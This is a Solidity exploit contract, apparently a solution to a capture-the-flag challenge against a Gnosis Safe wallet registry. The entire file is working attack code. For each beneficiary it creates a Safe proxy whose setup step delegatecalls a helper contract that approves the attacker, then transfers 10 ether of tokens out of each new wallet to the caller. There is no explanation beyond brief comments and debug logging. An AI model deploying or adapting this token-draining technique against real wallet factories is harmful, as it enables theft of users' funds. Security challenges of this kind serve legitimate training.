// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import {GnosisSafeProxyFactory} from '@gnosis.pm/safe-contracts/contracts/proxies/GnosisSafeProxyFactory.sol';
import {GnosisSafeProxy} from '@gnosis.pm/safe-contracts/contracts/proxies/GnosisSafeProxy.sol';
import {GnosisSafe} from '@gnosis.pm/safe-contracts/contracts/GnosisSafe.sol';
import {WalletRegistry} from './WalletRegistry.sol';
import {console} from 'hardhat/console.sol';
import {IERC20} from '@openzeppelin/contracts/token/ERC20/IERC20.sol';

// a sepearate contract is needed since is not possible to callback while deploying the Backdoor Attack contract
contract MaliciousApprove {
    function approve(address attacker, IERC20 token) public {
        token.approve(attacker, 10 ether);
    }
}

contract BackdoorAttack {
    constructor(address[] memory _people, address _proxyFactory, address _masterCopy, address _walletRegistry, address _token) {
        GnosisSafeProxyFactory proxyFactory = GnosisSafeProxyFactory(_proxyFactory);
        WalletRegistry walletRegistry = WalletRegistry(_walletRegistry);

        address attacker = address(new MaliciousApprove());
        // start the attack
        for (uint256 i = 0; i < _people.length; i++) {
            console.log('%s', i);
            address[] memory owners = new address[](1);
            owners[0] = _people[i];
            bytes memory initializer = abi.encodeWithSelector(
                GnosisSafe.setup.selector,
                owners,
                1,
                attacker, // setupModules
                abi.encodeWithSelector(MaliciousApprove.approve.selector, address(this), IERC20(_token)),
                address(0),
                address(0), // payment token
                0, // payment
                address(0) //
            );
            GnosisSafeProxy proxy = proxyFactory.createProxyWithCallback(_masterCopy, initializer, 0, walletRegistry);
            console.log('proxy address: %s', address(proxy));
            console.log('token balance: %s', IERC20(_token).balanceOf(address(proxy)));
            console.log('allowance : %s', IERC20(_token).allowance(address(proxy), address(this)));
            IERC20(_token).transferFrom(address(proxy), msg.sender, 10 ether);
        }
    }

    fallback() external payable {}

    receive() external payable {}
}
